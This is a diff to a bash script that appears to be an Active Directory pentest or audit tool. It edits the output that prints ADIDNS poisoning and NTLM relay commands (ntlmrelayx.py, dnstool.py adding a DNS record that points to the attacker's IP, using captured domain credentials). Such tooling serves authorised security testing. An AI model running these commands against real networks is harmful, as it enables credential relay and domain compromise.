@@ -46,7 +46,7 @@ if ! command -v certipy &>/dev/null && \
 fi
 
 if [ ! -f "/opt/tools/krbrelayx/dnstool.py" ]; then
-  echo -e "${GREY}[--] dnstool.py not found — ADIDNS live check will be skipped${NC}"
+  echo -e "${GREY}[--] dnstool.py not found - ADIDNS live check will be skipped${NC}"
 fi
 
 if ! command -v gowitness &>/dev/null; then
@@ -598,7 +598,7 @@ if echo "$ADIDNS_TEST" | grep -q "completed successfully"; then
   if [ "$RELAY_COUNT" -gt 0 ]; then
     echo -e "${RED}       └─ ADIDNS Poisoning + NTLM Relay possible${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
-    echo -e "${GREY}          2) dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<existing-hostname>' -a add -d <YOUR_IP> $DC_IP${NC}"
+    echo -e "${GREY}          2) dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<existing-fileshare-server>' -a add -d <YOUR_IP> $DC_IP${NC}"
     echo -e "${GREY}          3) Wait for auth to \\\\<hostname>\\share → relay to non-DC target${NC}"
   else
     echo -e "${GREY}       └─ dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<hostname>.<DOMAIN>' -a add -d <YOUR_IP> $DC_IP${NC}"
